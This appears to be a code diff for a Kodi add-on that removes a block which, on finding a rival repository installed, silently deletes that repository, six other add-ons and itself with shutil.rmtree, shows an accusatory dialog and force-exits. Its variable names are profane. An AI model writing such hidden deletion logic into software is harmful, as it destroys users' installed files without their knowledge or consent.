@@ -50,35 +50,6 @@ class md:
 			self.handle = int(sys.argv[1])
 			self.args = self.parse_query(sys.argv[2][1:])
 
-		fuck_you_anonymous1 = xbmc.translatePath('special://home/addons/plugin.program.anonymouswizard')
-		fuck_you_anonymous2 = xbmc.translatePath('special://home/addons/plugin.program.plugin.program.mafwizard')
-		fuck_you_anonymous3 = xbmc.translatePath('special://home/addons/plugin.video.ass')
-		fuck_you_anonymous4 = xbmc.translatePath('special://home/addons/plugin.video.floki')
-		fuck_you_anonymous5 = xbmc.translatePath('special://home/addons/plugin.video.kratos')
-		fuck_you_anonymous6 = xbmc.translatePath('special://home/addons/plugin.video.wargames')
-		fuck_you_anonymous7 = xbmc.translatePath('special://home/addons/repository.maf')
-		if os.path.exists(fuck_you_anonymous7):
-			line1 = "you have Installed From An"
-			line2 = "Unofficial Source And Will Now Delete Please"
-			line3 = "Install From [COLOR red]http://muckys.mediaportal4kodi.ml[/COLOR]"
-			line4 = "Removed Repos And Addons"
-			line5 = "successfully Please Dont Support Idiots"
-			self.addon.show_ok_dialog([line1, line2, line3], self.addon_name)
-			delete_addon = self.addon.get_path()
-			shutil.rmtree(delete_addon, ignore_errors=True)
-			shutil.rmtree(fuck_you_anonymous1, ignore_errors=True)
-			shutil.rmtree(fuck_you_anonymous2, ignore_errors=True)
-			shutil.rmtree(fuck_you_anonymous3, ignore_errors=True)
-			shutil.rmtree(fuck_you_anonymous4, ignore_errors=True)
-			shutil.rmtree(fuck_you_anonymous5, ignore_errors=True)
-			shutil.rmtree(fuck_you_anonymous6, ignore_errors=True)
-			shutil.rmtree(fuck_you_anonymous7, ignore_errors=True)
-			self.addon.log('===DELETING===ADDON===+===REPO===')
-			self.addon.show_ok_dialog([line4, line5], self.addon_name)
-			time.sleep(2)
-			os._exit(0)
-
-
 
 
 
